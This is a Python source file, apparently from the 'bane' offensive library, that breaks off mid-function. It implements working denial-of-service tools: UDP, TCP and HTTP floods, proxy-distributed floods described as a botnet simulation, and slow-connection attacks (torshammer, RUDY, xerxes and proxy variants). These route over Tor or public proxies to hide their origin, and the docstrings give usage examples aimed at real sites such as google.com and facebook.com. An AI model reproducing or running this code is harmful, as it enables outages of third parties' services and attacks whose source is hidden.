import requests,cfscrape,socks,os,sys,urllib,socket,random,time,threading,ssl
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
if  sys.version_info < (3,0):
    # Python 2.x
    import httplib
    import urllib2
    from scapy.all import *
else:
    py3=True
    # Python 3.x
    import http.client
    httplib = http.client
    import urllib.request
    urllib2=urllib.request
    from kamene.all import *
from struct import *
from bane.iot import getip
from bane.payloads import *
from bane.proxer import *
if os.path.isdir('/data/data')==True:
    adr=True
if os.path.isdir('/data/data/com.termux/')==True:
    termux=True
if ((termux==False) or (adr==False)):
 from bane.swtch import *
def get_public_dns(timeout=15):
 try:
  return (requests.get('https://public-dns.info/nameservers.txt',timeout=timeout).text).split('\n')
 except:
  return []
def kill():
 global stop
 stop=True
def reset():
 global counter
 counter=0
 global stop
 stop=False
 global coo
 coo=False
 global ual
 ual=[]
 global flag
 flag=-1
 global ier
 ier=0
 global pointer
 pointer=0
 global ue
 ue=[]
def udp(u,port=80,ports=None,level=3,min_size=1,max_size=1400,connection=True,interval=300,limiting=True,logs=True,returning=False):
  '''
   this function is for UDP flood attack tests.
   
   it takes 5 arguments:

   u: targeted ip
   port: (set by default to: 80) targeted port
   ports: (set by default to: None) it is used to define a list of ports to attack all without using multithreading, if its value has changed
   to a list, the port argument will be ignored and the list will be used instead, so be careful and set everything correctly.
   it should be defined as a list of integers seperated by ',' like: [80,22,21]
   connection: (set by default to: True) to make a connection before sending the packet
   level: (set by default to: 3) it defines the speed rate to send the packets:

   level=1 :  send packets with delay of 0.1 second between them
   level=2 :  send packets with delay of 0.01 second between them
   level=3 :  send packets with delay of 0.001 second between them

   size: (set by default to: 3) multiplying the size of the generated payloads:

   size=1 :  size of payload * 1
   size=2 :  size of payload * 10
   size=3 :  size of payload * 100

   when the attack starts you will see a stats of: total packets sent, packets sent per second, and bytes sent per second

   usage:

   >>>import bane
   >>>ip='25.33.26.12'
   >>>bane.udp(ip)

   >>>bane.udp(ip,port=80,level=1,size=3)

   >>>bane.udp(ip,ports=[21,50,80],level=2)
   
  '''
  global udp_counter
  udp_counter=0
  global rate1
  global rate2
  global counter
  if level<=1:
   t=.1
  elif level==2:
   t=.01
  elif level>=3:
   t=.001
  tm=time.time()
  while (int(time.time()-tm)<=interval):
   try:
    if ports:
     p=random.choice(ports)
    else:
     p=port
    s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
    if connection==True:
     s.connect((u,p))
    msg=''
    for x in range(random.randint(min_size,max_size)):
     msg+=random.choice(lis)
    if len(msg)>1400:
       msg=msg[0:1400]
    s.sendto((msg.encode('utf-8')),(u,p))
    udp_counter+=1
    rate1+=1
    rate2+=len(msg)
    if((logs==True) and (int(time.time()-tm)==1)):
     sys.stdout.write("\rStats=> Packets sent: {} | Rate: {} packets/s  {} bytes/s".format(udp_counter,rate1,rate2))
     sys.stdout.flush()
     tm=time.time()
     rate1=0
     rate2=0
    if limiting==True:
     time.sleep(t)
   except KeyboardInterrupt:
    break
   except Exception as e:
    try:
     time.sleep(t)
    except:
     pass
  print('')
  if returning==True:
   return udp_counter
class tcflood(threading.Thread):
 def run(self):
  global tcp_counter
  global stop
  self.target=target
  self.port=port
  self.timeout=timeout
  self.tor=tor
  self.minsize=minsize
  self.maxsize=maxsize
  self.speed=speed
  self.packs2=packs2
  self.packs1=packs1
  time.sleep(2)
  while (stop!=True):
   try:
    s =socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
    if self.tor==False:
     s.settimeout=(self.timeout)
    if self.tor==True:
     s.setproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1' , 9050, True)
    s.connect((self.target,self.port))
    if (self.port==443) or (self.port==8443):
      s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
    for l in range(random.randint(self.packs2,self.packs1)):
     if stop==True:
      break
     m=''
     for li in range(random.randint(self.minsize,self.maxsize)): 
      m+=random.choice(lis)
     try:
      if stop==True:
        break
      s.send(m.encode('utf-8'))
      tcp_counter+=1
      if prints==True:
       print("[!]Packets: {} | Bytes: {}".format(tcp_counter,len(m)))
     except Exception as dx:
      break
     time.sleep(self.speed)
    s.close()
   except Exception as e:
    pass
   time.sleep(.1)
'''
  usage:

  >>>bane.tcpflood('www.google.com')

  >>>bane.tcpflood('www.google.com',p=80, threads=150, maxtime=5)

  p: (set by default to: 80) targeted port
  threads: (set by default to: 256) threads to use
  maxtime: (set by default to: 5) timeout flag
'''
def tcpflood(u,p=80,min_size=1,max_size=1400,threads=256,maxtime=5,roundmin=5,roundmax=15,level=1,interval=300,logs=True,returning=False,settor=False):
 global minsize
 minsize=min_size
 global maxsize
 maxsize=max_size
 global tcp_counter
 tcp_counter=0
 global tor
 tor=settor
 global stop
 stop=False
 global prints
 prints=logs
 global target
 target=u
 global port
 port=p
 global timeout
 timeout=maxtime
 global packs1
 packs1=roundmax
 global packs2
 packs2=roundmin
 global speed
 if level<=1:
  speed=0.1
 elif level==2:
  speed=0.05
 elif level==3:
  speed=0.01
 elif level==4:
  speed=0.005
 elif level>=5:
  speed=0.001
 for x in range(threads):
  t=tcflood()
  t.start()
 c=time.time()
 while True:
  if stop==True:
   break
  try:
   time.sleep(.1)
   if int(time.time()-c)==interval:
    stop=True
    break
  except KeyboardInterrupt:
   stop=True
   break
 if returning==True:
  return tcp_counter
class htflood(threading.Thread):
 def run(self):
  global http_counter
  self.postfmin=postfmin
  self.postfmax=postfmax
  self.target=target
  self.postmin=postmin
  self.postmax=postmax
  self.port=port
  self.timeout=timeout
  self.tor=tor
  self.speed=speed
  self.packs2=packs2
  self.packs1=packs1
  time.sleep(2)
  while (stop!=True):
   try:
    s =socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
    if self.tor==False:
     s.settimeout=(self.timeout)
    if self.tor==True:
     s.setproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1' , 9050, True)
    s.connect((self.target,self.port))
    if ((self.port==443) or (self.port==8443)):
      s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
    for fg in range(random.randint(self.packs2,self.packs1)):
     if stop==True: 
       break
     pa=random.choice(paths)
     q=''
     for i in range(random.randint(2,5)):
      q+=random.choice(lis)+str(random.randint(1,100000))
     p=''
     for i in range(random.randint(2,5)):
      p+=random.choice(lis)+str(random.randint(1,100000))
     if '?' in pa:
      jo='&'
     else:
      jo='?' 
     pa+=jo+q+"="+p
     for l in range(random.randint(1,5)):
      ed=random.choice(ec)
      oi=random.randint(1,3)
      if oi==2:
       gy=0
       while gy<1:
        df=random.choice(ec)
        if df!=ed:
         gy+=1
       ed+=', '
       ed+=df
     l=random.choice(al)
     for n in range(random.randint(0,5)):
      l+=';q={},'.format(round(random.uniform(.1,1),1))+random.choice(al)
     kl=random.randint(1,2)
     if kl==1:
      req="GET"
      m='GET {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept: {}\r\nAccept-Language: {}\r\nAccept-Encoding: {}\r\nAccept-Charset: {}\r\nKeep-Alive: {}\r\nConnection: Keep-Alive\r\nCache-Control: {}\r\nReferer: {}\r\nHost: {}\r\n\r\n'.format(pa,random.choice(ua),random.choice(a),l,ed,random.choice(ac),random.randint(100,1000),random.choice(cc),(random.choice(referers)+random.choice(lis)+str(random.randint(0,100000000))+random.choice(lis)),self.target)
     else:
      req="POST"
      k=''
      for _ in range(random.randint(self.postfmin,self.postfmax)):
       k+=random.choice(lis)
      j=''
      for x in range(random.randint(self.postmin,self.postmax)):
       j+=random.choice(lis)
      par =k+'='+j
      m= "POST {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: {}\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nReferer: {}\r\nHost: {}\r\n\r\n{}".format(pa,random.choice(ua),l,random.randint(300,1000),len(par),(random.choice(referers)+random.choice(lis)+str(random.randint(0,100000000))+random.choice(lis)),self.target,par)
     try:
      if stop==True:
        break
      s.send(m.encode('utf-8'))
      http_counter+=1
      if prints==True:
       print("[!]Request: {} | Type: {} | Bytes: {}".format(http_counter,req,len(m)))
     except :
      break
     time.sleep(self.speed)
    s.close()
   except:
    pass
   time.sleep(.1)
'''
   the following functions and clases are for DoS attacks simulations with different tools that have been either originally written in 
   diffferent languages (Perl: slowloris and C: xerxes and slowread attack...) and rewritten in python and other python tools that are PoC for 
   some vulnerabilities (slow post attacks, hulk) with some modifications that has improved their performance!!!

   they have similar usage like "tcpflood" function:

   >>>bane.slowloris('www.google.com',p=443,threads=20)
   >>>bane.torshammer('www.facebook.com',p=80,threads=1000,settor=False)
   (settor: (set by default to: False) to enable connection through local tor's local socks5 proxy
   >>>bane.hulk('www.google.com',threads=700)
   >>>bane.synflood('50.63.33.34',threads=100)

   there will be lessons how to use them all don't worry guys xD
'''
def httpflood(u,p=80,post_field_min=5,post_field_max=10,post_min=50,post_max=500,threads=256,maxtime=5,roundmin=5,roundmax=15,level=1,interval=300,logs=True,returning=False,settor=False):
 '''
   this function is for http flood attack. it connect to a given port and flood it with http requests (GET & POST) with randomly headers values to make each request uniques with bypass caching engines techniques.
   it takes the following parameters:

   u: the target ip or domain
   p: (set by default to: 80) the port used in the attack
   threads: (set by default to: 256) the number of threading that you are going to use
   maxtime: (set by default to: 5) the timeout flag value

   example:

   >>>import bane
   >>>bane.httpflood('www.google.com',p=80,threads=500,maxtime=7)

'''
 global postfmin
 postfmin=post_field_min
 global postfmax
 postfmax=post_field_max
 global postmin
 postmin=post_min
 global postmax
 postmax=post_max
 global http_counter
 http_counter=0
 global tor
 tor=settor
 global stop
 stop=False
 global target
 target=u
 global prints
 prints=logs
 global port
 global counter
 port=p
 global timeout
 timeout=maxtime
 global packs1
 packs1=roundmax
 global packs2
 packs2=roundmin
 global speed
 if level<=1:
  speed=0.1
 elif level==2:
  speed=0.05
 elif level==3:
  speed=0.01
 elif level==4:
  speed=0.005
 elif level>=5:
  speed=0.001
 for x in range(threads):
  t=htflood()
  t.start()
 c=time.time()
 while True:
  if stop==True:
   break
  try:
   time.sleep(.1)
   if int(time.time()-c)==interval:
    stop=True
    break
  except KeyboardInterrupt:
   stop=True
   break
 if returning==True:
  return http_counter
class prflood(threading.Thread):
 def run(self):
  global lulzer_counter
  self.postfmin=postfmin
  self.postfmax=postfmax
  self.postmin=postmin
  self.postmax=postmax
  self.target=target
  self.port=port
  self.timeout=timeout
  self.speed=speed
  self.packs2=packs2
  self.packs1=packs1
  time.sleep(2)
  while (stop!=True):
   try:
    z=random.randint(1,20)
    if (z in [1,2,3,4,5,6,7,8,9,10,11,12]):
     line=random.choice(httplist)
    elif (z in [13,14,15,16]):
     line=random.choice(socks4list)
    elif (z in [17,18,19,20]):
     line=random.choice(socks5list)
    ipp=line.split(":")[0].split("=")[0]
    pp=line.split(":")[1].split("=")[0]
    s =socks.socksocket()
    if (z in [1,2,3,4,5,6,7,8,9,10,11,12]):
     s.setproxy(socks.PROXY_TYPE_HTTP, str(ipp), int(pp), True)
    elif (z in [13,14,15,16]):
     s.setproxy(socks.PROXY_TYPE_SOCKS4, str(ipp), int(pp), True)
    elif (z in [17,18,19,20]):
     s.setproxy(socks.PROXY_TYPE_SOCKS5, str(ipp), int(pp), True)
    if (z in [1,2,3,4,5,6,7,8,9,10,11,12]):
     s.settimeout(self.timeout)
    s.connect((self.target,self.port))
    if ((self.port==443) or (self.port==8443)):
      s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
    for fg in range(random.randint(self.packs2,self.packs1)):
     if stop==True:
      break
     for l in range(random.randint(1,5)):
      ed=random.choice(ec)
      oi=random.randint(1,3)
      if oi==2:
       gy=0
       while gy<1:
        df=random.choice(ec)
        if df!=ed:
         gy+=1
       ed+=', '
       ed+=df
     l=random.choice(al)
     for n in range(random.randint(0,5)):
      l+=';q={},'.format(round(random.uniform(.1,1),1))+random.choice(al)
     pa=random.choice(paths)
     q=''
     for i in range(random.randint(2,5)):
      q+=random.choice(lis)+str(random.randint(1,100000))
     p=''
     for i in range(random.randint(2,5)):
      p+=random.choice(lis)+str(random.randint(1,100000))
     if '?' in pa:
      jo='&'
     else:
      jo='?' 
     pa+=jo+q+"="+p
     kl=random.randint(1,2)
     if kl==1:
      req="GET"
      m='GET {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept: {}\r\nAccept-Language: {}\r\nAccept-Encoding: {}\r\nAccept-Charset: {}\r\nKeep-Alive: {}\r\nConnection: Keep-Alive\r\nCache-Control: {}\r\nReferer: {}\r\nHost: {}\r\n\r\n'.format(pa,random.choice(ua),random.choice(a),l,ed,random.choice(ac),random.randint(100,1000),random.choice(cc),(random.choice(referers)+random.choice(lis)+str(random.randint(0,100000000))+random.choice(lis)),self.target)
     else:
      req="POST"
      k=''
      for _ in range(random.randint(self.postfmin,self.postfmax)):
       k+=random.choice(lis)
      j=''
      for x in range(random.randint(self.postmin,self.postmax)):
       j+=random.choice(lis)
      par =k+'='+j
      m= "POST {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: {}\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nReferer: {}\r\nHost: {}\r\n\r\n{}".format(pa,random.choice(ua),l,random.randint(300,1000),len(par),(random.choice(referers)+random.choice(lis)+str(random.randint(0,100000000))+random.choice(lis)),self.target,par)
     try:
      if stop==True:
        break
      s.send(m.encode('utf-8'))
      lulzer_counter+=1
      if prints==True:
       print("[!]Bot: {} | Request: {} | Type: {} | Bytes: {}".format(ipp,lulzer_counter,req,len(m)))
     except Exception as e:
      break
     time.sleep(self.speed)
    s.close()
   except:
    pass
   time.sleep(.1)
def lulzer(u,p=80,threads=100,maxtime=7,httpl=None,socks4l=None,socks5l=None,post_field_min=5,post_field_max=10,post_min=50,post_max=500,roundmin=5,roundmax=15,level=1,interval=3600,logs=True,returning=False):
 '''
   this function is for http flood attack but it distribute the around the world by passing the requests to thousands of proxies located in many countries (it is stimulation to real life botnet).
   it takes the following parameters:

   u: the target ip or domain
   p: (set by default to: 80) the port used in the attack
   threads: (set by default to: 100) the number of threading that you are going to use
   maxtime: (set by default to: 5) the timeout flag value
   httpl: (set by default to: None) it takes a list of custom http proxies list that the user provide to be used
   socks4l: (set by default to: None) it takes a list of custom socks4 proxies list that the user provide to be used
   socks5l: (set by default to: None) it takes a list of custom socks5 proxies list that the user provide to be used

   example:

   >>>import bane
   >>>bane.lulzer('www.google.com',p=80,threads=500)

'''
 global postfmin
 postfmin=post_field_min
 global postfmax
 postfmax=post_field_max
 global postmin
 postmin=post_min
 global postmax
 postmax=post_max
 global lulzer_counter
 lulzer_counter=0
 global stop
 stop=False
 global prints
 prints=logs
 global httplist
 if httpl:
  httplist=httpl
 else:
  httplist=masshttp()
 global socks4list
 if socks4l:
  socks4list=socks4l
 else:
  socks4list=massocks4()
 global socks5list
 if socks5l:
  socks5list=socks5l
 else:
  socks5list=massocks5()
 global target
 target=u
 global port
 port=p
 global timeout
 timeout=maxtime
 global packs1
 packs1=roundmax
 global packs2
 packs2=roundmin
 global speed
 if level<=1:
  speed=0.1
 elif level==2:
  speed=0.05
 elif level==3:
  speed=0.01
 elif level==4:
  speed=0.005
 elif level>=5:
  speed=0.001
 for x in range(threads):
  t=prflood()
  t.start()
 c=time.time()
 while True:
  if stop==True:
   break
  try:
   time.sleep(.1)
   if int(time.time()-c)==interval:
    stop=True
    break
  except KeyboardInterrupt:
   stop=True
   break
 if returning==True:
  return lulzer_counter
class reqpost(threading.Thread):
 def run(self):
  self.maxcontent=maxcontent
  self.mincontent=mincontent
  self.target=target
  self.port=port
  self.timeout=timeout
  self.tor=tor
  time.sleep(2)
  while (stop!=True):
   try:
    s =socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
    if self.tor==False:
     s.settimeout(self.timeout)
    if tor==True:
     s.setproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1' , 9050, True)
    s.connect((self.target,self.port))
    if prints==True:
     print("Connected to {}:{}...".format(self.target,self.port))
    if ((self.port==443) or (self.port==8443)):
     s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
    q=random.randint(self.mincontent,self.maxcontent)
    s.send("POST {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nReferer: {}\r\nHost: {}\r\n\r\n".format(random.choice(paths),random.choice(ua),random.randint(300,1000),q,(random.choice(referers)+random.choice(lis)+str(random.randint(0,100000000))+random.choice(lis)),self.target))
    for i in range(q):
     if stop==True:
      break
     h=random.choice(lis)
     try:
      s.send(h.encode('utf-8'))
      if prints==True:
       print("Posted: {}".format(h))
      time.sleep(random.uniform(.1,3))
     except:
      break
    s.close()
   except:
    pass
   time.sleep(.1)
   if stop==True:
    break
def torshammer(u,p=80,threads=500,maxtime=5,settor=False,interval=300,logs=True,max_content=15000,min_content=10000):
 '''
    this function is used to do torshammer attack, it connects to an ip or domain with a specific port, sends a POST request with legit http headers values then sends the body slowly to keep the socket open as long as possible. it can use tor as a proxy to anonimize the attack. it supports ssl connections unlike the original tool and some bugs has been fixed and simplified.
    
    it takes those parameters:

    u: the target ip or domain
    p: (set by default to: 80) the targeted port
    threads: (set by default to: 500) number of connections to be created
    maxtime: (set by default to: 5) connection timeout flag value
    settor: (set by default to: False) if you want to use tor as SOCKS5 proxy after activating it you must set this parameter to: True

    example:

    >>>import bane
    >>>bane.torshammer('www.google.com',p=80)

    >>>bane.torshammer('www.google.com',p=80,settor=True)

'''
 global maxcontent
 maxcontent=max_content
 global mincontent
 mincontent=min_content
 global stop
 stop=False
 global prints
 prints=logs
 global target
 target=u
 global port
 port=p
 global timeout
 timeout=maxtime
 global tor
 tor=settor
 for x in range(threads):
     t =reqpost()
     t.start()
 c=time.time()
 while True:
  if stop==True:
   break
  try:
   time.sleep(.1)
   if int(time.time()-c)==interval:
    stop=True
    break
  except KeyboardInterrupt:
   stop=True
   break
class pham(threading.Thread):
 def run(self):
  self.target=target
  self.port=port
  self.timeout=timeout
  self.maxcontent=maxcontent
  self.mincontent=mincontent
  global counter
  time.sleep(2)
  while (stop!=True):
   try:
    z=random.randint(1,20)
    if (z in [1,2,3,4,5,6,7,8,9,10,11,12]):
     line=random.choice(httplist)
    elif (z in [13,14,15,16]):
     line=random.choice(socks4list)
    elif (z in [17,18,19,20]):
     line=random.choice(socks5list)
    ipp=line.split(":")[0].split("=")[0]
    pp=line.split(":")[1].split("=")[0]
    s =socks.socksocket()
    if (z in [1,2,3,4,5,6,7,8,9,10,11,12]):
     s.setproxy(socks.PROXY_TYPE_HTTP, str(ipp), int(pp), True)
    elif (z in [13,14,15,16]):
     s.setproxy(socks.PROXY_TYPE_SOCKS4, str(ipp), int(pp), True)
    elif (z in [17,18,19,20]):
     s.setproxy(socks.PROXY_TYPE_SOCKS5, str(ipp), int(pp), True)
    s =socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
    if z<13:
     s.settimeout(self.timeout)
    s.connect((self.target,self.port))
    if ((self.port==443)or(self.port==8443)):
     s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
    q=random.randint(self.mincontent,self.maxcontent)
    s.send("POST {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nReferer: {}\r\nHost: {}\r\n\r\n".format(random.choice(paths),random.choice(ua),random.randint(300,1000),q,(random.choice(referers)+random.choice(lis)+str(random.randint(0,100000000))+random.choice(lis)),self.target))
    for i in range(q):
     if stop==True:
      break
     h=random.choice(lis)
     try:
      s.send(h.encode('utf-8'))
      if prints==True:
       print("Posted: {} --> {}".format(h,ipp))
      time.sleep(random.uniform(.1,3))
     except:
      break
    s.close()
   except:
    pass
   time.sleep(.1)
   if stop==True:
    break
def proxhammer(u,p=80,max_content=15000,min_content=10000,threads=700,maxtime=5,httpl=None,socks4l=None,socks5l=None,interval=300,logs=True):
 '''
  u: target ip or domain
  p: (set by default to: 80) targeted port
  threads: (set by default to: 500) number of connections
  maxtime: (set by default to: 5) the connection timeout flag value
  example:
  >>>import bane
  >>>bane.proxhammer('www.google.com',threads=256)
'''
 global maxcontent
 maxcontent=max_content
 global mincontent
 mincontent=min_content
 global httplist
 if httpl:
  httplist=httpl
 else:
  httplist=masshttp()
 global socks4list
 if socks4l:
  socks4list=socks4l
 else:
  socks4list=massocks4()
 global socks5list
 if socks5l:
  socks5list=socks5l
 else:
  socks5list=massocks5()
 global stop
 stop=False
 global prints
 prints=logs
 global pointer
 global target
 target=u
 global port
 port=p
 global timeout
 timeout=maxtime
 for j in range(threads):
    t=pham()
    t.start()
    time.sleep(.001)
 c=time.time()
 while True:
  if stop==True:
   break
  try:
   time.sleep(.1)
   if int(time.time()-c)==interval:
    stop=True
    break
  except KeyboardInterrupt:
   stop=True
   break
class rudypost(threading.Thread):
 def run(self):
  self.r_wait=r_wait
  self.r_max=r_max
  self.r_min=r_min
  self.form_lng=form_lng
  self.max_fo=max_fo
  self.min_fo=min_fo
  self.fo=fo
  self.pag=pag
  self.target=target
  self.port=port
  self.timeout=timeout
  self.tor=tor
  time.sleep(2)
  while (stop!=True):
   try:
    s =socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
    if self.tor==False:
     s.settimeout(self.timeout)
    if tor==True:
     s.setproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1' , 9050, True)
    s.connect((self.target,self.port))
    if prints==True:
     print("Connected to {}:{}...".format(self.target,self.port))
    if ((self.port==443) or (self.port==8443)):
     s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
    if self.form_lng<1:
     q=random.randint(self.min_fo,self.max_fo)
    else:
     q=self.form_lng
    s.send("POST {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nReferer: {}\r\nHost: {}\r\n\r\n".format(self.pag,random.choice(ua),random.randint(300,1000),q,(random.choice(referers)+random.choice(lis)+str(random.randint(0,100000000))+random.choice(lis)),self.target))
    rud='{}='.format(self.fo)
    s.send(rud.encode('utf-8'))
    for i in range(q):
     if stop==True:
      break
     h=random.choice(lis)
     try:
      s.send(h.encode('utf-8'))
      if prints==True:
       print("Posted: {}".format(h))
      if self.r_wait<0:
       time.sleep(random.randint(self.r_min,self.r_max))
      else:
       time.sleep(self.r_wait)
     except:
      break
    s.close()
   except:
    pass
   time.sleep(.1)
   if stop==True:
    break
def rudy(u,p=80,threads=500,form='q',form_len=0,max_form=1000000,min_form=10000,page='/',maxtime=5,settor=False,interval=300,logs=True,wait=-1,max_wait=5,min_wait=1):
 '''
    this function is used to do torshammer attack, it connects to an ip or domain with a specific port, sends a POST request with legit http headers values then sends the body slowly to keep the socket open as long as possible. it can use tor as a proxy to anonimize the attack. it supports ssl connections unlike the original tool and some bugs has been fixed and simplified.
    
    it takes those parameters:

    u: the target ip or domain
    p: (set by default to: 80) the targeted port
    threads: (set by default to: 500) number of connections to be created
    maxtime: (set by default to: 5) connection timeout flag value
    settor: (set by default to: False) if you want to use tor as SOCKS5 proxy after activating it you must set this parameter to: True

    example:

    >>>import bane
    >>>bane.torshammer('www.google.com',p=80)

    >>>bane.torshammer('www.google.com',p=80,settor=True)

'''
 global r_wait
 r_wait=wait
 global r_max
 r_max=max_wait
 global r_min
 r_min=min_wait
 global form_lng
 form_lng=form_len
 global pag
 pag=page
 global fo
 fo=form
 global max_fo
 max_fo=max_form
 global min_fo
 min_fo=min_form
 global stop
 stop=False
 global prints
 prints=logs
 global target
 target=u
 global port
 port=p
 global timeout
 timeout=maxtime
 global tor
 tor=settor
 for x in range(threads):
     t =rudypost()
     t.start()
 c=time.time()
 while True:
  if stop==True:
   break
  try:
   time.sleep(.1)
   if int(time.time()-c)==interval:
    stop=True
    break
  except KeyboardInterrupt:
   stop=True
   break
class xer(threading.Thread):
 def run(self):
  x=pointer
  self.target=target
  self.port=port
  self.timeout=timeout
  self.tor=tor
  time.sleep(2)
  while (stop!=True):
   try:
    s =socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
    if self.tor==False:
     s.settimeout(self.timeout)
    if self.tor==True:
     s.setproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1' , 9050, True)
    s.connect((self.target,self.port))
    if prints==True:
     print("[Connected to {}:{}]".format(self.target,self.port))
    while (stop!=True):
     try:
      s.send("\x00".encode('utf-8'))
      if prints==True:
       print("[{}: Voly sent]".format(x))
     except Exception as e:
      break
     time.sleep(.2)
   except:
    pass
   time.sleep(.3)
def xerxes(u,p=80,threads=500,maxtime=5,interval=300,logs=True,settor=False):
 '''
   everyone heard about the 'xerxes.c' tool ( https://github.com/zanyarjamal/xerxes/blob/master/xerxes.c ), but not everyone really understand what does it do exactly to take down targets, actually some has claimed that it sends few Gbps :/ (which is something really funny looool) . let me illuminate you: this tool is similar to slowloris, it consume all avaible connections on the server and keep them open as long as possible not by sending partial http headers slowly but by sending "NULL byte character" per connection every 0.3 seconds (so actually it doesn't really send much data). it uses 48 threads and 8 connections per thread, so the maximum number of connections that this tool can create is: 384 connections. that's why it works perfectly against apache for example (maximum number of connections that it handle simultaniously is 256 by dafault) but not against the ones with larger capacity.

  here i did something different a bit but it gave better results: instead of a 8 connections per thread, i used one per thread with infinite loop so when the connection is closed, a new one will be created unlike the C version, and you can use as much as you need of threads for more connections (not just 384)!!! and this gave me a much better results and it will do the same to you ;)

  this function takes the following parameters:
    
  u: target ip or domain
  p: (set by default to: 80) targeted port
  threads: (set by default to: 500) number of connections
  maxtime: (set by default to: 5) the connection timeout flag value

  example:

  >>>import bane
  >>>bane.xerxes('www.google.com',threads=256)

'''
 global tor
 tor=settor
 global stop
 stop=False
 global prints
 prints=logs
 global pointer
 global target
 target=u
 global port
 port=p
 global timeout
 timeout=maxtime
 for j in range(threads):
    pointer=j
    t=xer()
    t.start()
    time.sleep(.001)
 c=time.time()
 while True:
  if stop==True:
   break
  try:
   time.sleep(.1)
   if int(time.time()-c)==interval:
    stop=True
    break
  except KeyboardInterrupt:
   stop=True
   break
class pxer(threading.Thread):
 def run(self):
  global counter
  x=pointer
  self.target=target
  self.port=port
  self.timeout=timeout
  time.sleep(2)
  while (stop!=True):
   try:
    z=random.randint(1,20)
    if (z in [1,2,3,4,5,6,7,8,9,10,11,12]):
     line=random.choice(httplist)
    elif (z in [13,14,15,16]):
     line=random.choice(socks4list)
    elif (z in [17,18,19,20]):
     line=random.choice(socks5list)
    ipp=line.split(":")[0].split("=")[0]
    pp=line.split(":")[1].split("=")[0]
    s =socks.socksocket()
    if (z in [1,2,3,4,5,6,7,8,9,10,11,12]):
     s.setproxy(socks.PROXY_TYPE_HTTP, str(ipp), int(pp), True)
    elif (z in [13,14,15,16]):
     s.setproxy(socks.PROXY_TYPE_SOCKS4, str(ipp), int(pp), True)
    elif (z in [17,18,19,20]):
     s.setproxy(socks.PROXY_TYPE_SOCKS5, str(ipp), int(pp), True)
    s =socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
    if z<13:
     s.settimeout(self.timeout)
    s.connect((self.target,self.port))
    while (stop!=True):
     try:
      s.send("\x00".encode('utf-8'))
      if prints==True:
       print("[{}: Voly sent-->{}]".format(x,ipp))
     except:
      break
     time.sleep(.2)
   except:
    pass
   time.sleep(.3)
def proxerxes(u,p=80,threads=700,maxtime=5,httpl=None,socks4l=None,socks5l=None,interval=300,logs=True,level=1):
 '''
  u: target ip or domain
  p: (set by default to: 80) targeted port
  threads: (set by default to: 500) number of connections
  maxtime: (set by default to: 5) the connection timeout flag value
  example:
  >>>import bane
  >>>bane.proxhammer('www.google.com',threads=256)
'''
 global speed
 speed=level
 global httplist
 if httpl:
  httplist=httpl
 else:
  httplist=masshttp()
 global socks4list
 if socks4l:
  socks4list=socks4l
 else:
  socks4list=massocks4()
 global socks5list
 if socks5l:
  socks5list=socks5l
 else:
  socks5list=massocks5()
 global stop
 stop=False
 global prints
 prints=logs
 global pointer
 global target
 target=u
 global port
 port=p
 global timeout
 timeout=maxtime
 global pointer
 for j in range(threads):
    pointer=j
    t=pxer()
    t.start()
    time.sleep(.001)
 c=time.time()
 while True:
  if stop==True:
   break
  try:
   time.sleep(.1)
   if int(time.time()-c)==interval:
    stop=True
    break
  except KeyboardInterrupt:
   stop=True
   break
class slrd(threading.Thread):
 def run(self):
  self.target=target
  self.port=port
  self.timeout=timeout
  self.tor=tor
  self.speed=speed
  self.rre2=rre2
  self.rre1=rre1
  self.sre1=sre1
  self.sre2=sre2
  time.sleep(2)
  while (stop!=True):
   try: 
    s =socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
    if self.tor==False:
     s.settimeout(self.timeout)
    if self.tor==True:
     s.setproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1' , 9050, True)
    s.connect((self.target,self.port))
    if ((self.port==443)or(self.port==8443)):
     s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
    while (stop!=True):
     pa=random.choice(paths)
     q=''
     for i in range(random.randint(2,5)):
      q+=random.choice(lis)+str(random.randint(1,100000))
     p=''
     for i in range(random.randint(2,5)):
      p+=random.choice(lis)+str(random.randint(1,100000))
     if '?' in pa:
      jo='&'
     else:
      jo='?' 
     pa+=jo+q+"="+p
     try:
      g=random.randint(1,2)
      if g==1:
